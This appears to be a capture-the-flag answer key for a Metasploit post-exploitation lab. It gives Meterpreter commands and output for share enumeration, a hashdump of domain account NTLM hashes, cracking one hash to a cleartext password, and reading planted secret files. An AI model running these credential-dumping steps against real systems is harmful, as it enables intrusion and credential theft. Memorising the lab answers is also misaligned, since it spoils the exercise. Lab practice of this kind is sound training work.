

1. What is the computer name?   ACME-TEST

2. What is the target domain?   FLASH

```
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/Windows

```


3. What is the name of the share likely created by the user?  speedster

```
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > set session 1
session => 1
msf6 post(windows/gather/enum_shares) > run
[*] Running module against ACME-TEST (10.10.93.243)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed

``` 
  

4. What is the NTLM hash of the jchambers user?  69596c7aa1e8daee17f8e78870e25a5c

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:1a8495c3f426341daf17a5868b2c7996:::

```

5. What is the cleartext password of the jchambers user?  Trustno1

```
https://crackstation.net/
69596c7aa1e8daee17f8e78870e25a5c

Hash	Type	Result
69596c7aa1e8daee17f8e78870e25a5c	NTLM	Trustno1

```

6. Where is the "secrets.txt"  file located? (Full path of the file)  c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt

```
search -f secrets.txt

Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100

```

7. What is the Twitter password revealed in the "secrets.txt" file?  KDSvbsw3849!

```

meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
My Twitter password is KDSvbsw3849!

```

8. Where is the "realsecret.txt" file located? (Full path of the file)  c:\inetpub\wwwroot\realsecret.txt   

```
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100

```

9. What is the real secret?  The Flash is the fastest man alive

```
meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
The Flash is the fastest man alive

```






